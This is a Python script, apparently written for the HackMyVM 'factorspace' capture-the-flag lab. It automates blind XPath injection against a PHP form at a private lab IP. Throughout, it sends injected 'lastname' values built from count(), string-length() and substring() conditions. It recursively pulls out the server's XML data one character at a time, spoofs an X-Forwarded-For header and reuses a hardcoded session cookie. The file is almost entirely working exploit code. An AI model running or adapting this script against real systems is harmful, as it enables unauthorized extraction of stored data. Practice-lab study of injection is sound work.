'''
   Title:  blind xpath injection (hackmyvm factorspace)
   Author: Shuichiro Endo
'''

import sys
import string
import zlib
import json
import os.path
import urllib.request
import urllib.parse
import urllib.error
import urllib.robotparser


match_string = "John"
count_node_max_num = 10			# count()
count_string_length_max_num = 50	# string-length()

url = ""
base = "http://192.168.56.111/"
path = "results.php"
#method = "GET"
method = "POST"

headers = {
    "Host":"192.168.56.111",
    "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language":"en-US,en;q=0.5",
    "Accept-Encoding":"gzip, deflate",
    "Content-Type":"application/x-www-form-urlencoded",
#    "DNT":"1",
#    "Origin":"",
#    "Referer":"",
    "X-Forwarded-For":"127.0.0.1",
    "Connection":"close",
    "Cookie":"PHPSESSID=ko4u299lk2ivls8qe49hctap7b; 5f5b5a7677756d5c5b5a593931383736=true",
#    "":"",
#    "":"",
#    "":"",
}

'''
num = string.digits
alpha = string.ascii_letters
alpha_lower = string.ascii_lowercase
alpha_upper = string.ascii_uppercase
alpha_num = string.ascii_letters + string.digits
alpha_lower_num = string.ascii_lowercase + string.digits
alpha_upper_num = string.ascii_uppercase + string.digits
punc = string.punctuation
printable = string.printable
'''

def make_url(method, query):
    if method == "GET":
        print("GET")
        
    elif method == "POST":
        list = [base, path]
        url = os.path.join(*list)
        
    else:
        print("method error.")
        sys.exit(1)
        
#    print("url:" + url)
    
    return url
    
    
def count_node(method, p):
    if method == "GET":
        print("GET")
        
    elif method == "POST":
         for i in range(1, count_node_max_num):
             q = "count(" + p +")=" + str(i)
             
             query = {
                 "lastname":"Doe' and " + q + " and 'a'='a",
#                 "":"",
             }
             
             url = make_url(method, None)
             
             post_data = urllib.parse.urlencode(query).encode("utf-8")
             
             req = urllib.request.Request(url=url, data=post_data, headers=headers, method=method)
             
             try:
                 with urllib.request.urlopen(req) as res:
#                     text = res.read().decode("utf-8", "ignore")
                     decompressed_data = zlib.decompress(res.read(), 16+zlib.MAX_WBITS)
                     text = decompressed_data.decode("utf-8")
#                     print(text)
                     
                     if (text.find(match_string) != -1):
                         print("count(" + p + ")=" + str(i))
                         return i
                     
             except urllib.error.HTTPError as e:
                 if e.code >= 400:
                     print(e.reason)
#                     sys.exit(1)
                      
                 else:
                     raise e
#                     sys.exit(1)
                     
    else:
        print("method error.")
        sys.exit(1)
    
    
def count_string_length(method, p):
    if method == "GET":
        print("GET")
        
    elif method == "POST":
         for i in range(1, count_string_length_max_num):
             q = "string-length(" + p +")=" + str(i)
             
             query = {
                 "lastname":"Doe' and " + q + " and 'a'='a",
#                 "":"",
             }
             
             url = make_url(method, None)
             
             post_data = urllib.parse.urlencode(query).encode("utf-8")
             
             req = urllib.request.Request(url=url, data=post_data, headers=headers, method=method)
             
             try:
                 with urllib.request.urlopen(req) as res:
#                     text = res.read().decode("utf-8", "ignore")
                     decompressed_data = zlib.decompress(res.read(), 16+zlib.MAX_WBITS)
                     text = decompressed_data.decode("utf-8")
#                     print(text)
                     
                     if (text.find(match_string) != -1):
                         print("string-length(" + p + ")=" + str(i))
                         return i
                     
             except urllib.error.HTTPError as e:
                 if e.code >= 400:
                     print(e.reason)
#                     sys.exit(1)
                      
                 else:
                     raise e
#                     sys.exit(1)
                     
    else:
        print("method error.")
        sys.exit(1)
    
    
def search_substring(method, p, c):
    s = ""
    
    if method == "GET":
        print("GET")
        
    elif method == "POST":
         for i in range(1, c+1):
             for j in string.printable:
                 q = "substring(" + p +"," + str(i) + ",1)=" + "\'" + j + "\'"
                 
                 query = {
                     "lastname":"Doe' and " + q + " and 'a'='a",
#                     "":"",
                 }
                 
                 url = make_url(method, None)
                 
                 post_data = urllib.parse.urlencode(query).encode("utf-8")
                 
                 req = urllib.request.Request(url=url, data=post_data, headers=headers, method=method)
                 
                 try:
                     with urllib.request.urlopen(req) as res:
#                         text = res.read().decode("utf-8", "ignore")
                         decompressed_data = zlib.decompress(res.read(), 16+zlib.MAX_WBITS)
                         text = decompressed_data.decode("utf-8")
#                         print(text)
                         
                         if (text.find(match_string) != -1):
                             s = s + j
                         
                 except urllib.error.HTTPError as e:
                     if e.code >= 400:
                         print(e.reason)
#                         sys.exit(1)
                          
                     else:
                         raise e
#                         sys.exit(1)
                     
    else:
        print("method error.")
        sys.exit(1)
    
    if s != "":
        print("string:" + s)
    
   
def search_xpath(method, p, c):
    if method == "GET":
         print("GET")
         
    elif method == "POST":
        ret = count_node(method, p)
        if ret != None:
            for i in range(1, ret+1):
                path = p + "[" + str(i) + "]"
                len = count_string_length(method, path)
                if len != None:
                    search_substring(method, path, len)
                    
            for i in range(1, ret+1):
                path = p + "[" + str(i) + "]/*"
                search_xpath(method, path, ret)
                            
    else:
        print("method error.")
        sys.exit(1)
    
    
def main(argv):
    p = "/*"	# root
    search_xpath(method, p, 1);
    
        
if __name__ == '__main__':
    sys.exit(main(sys.argv))


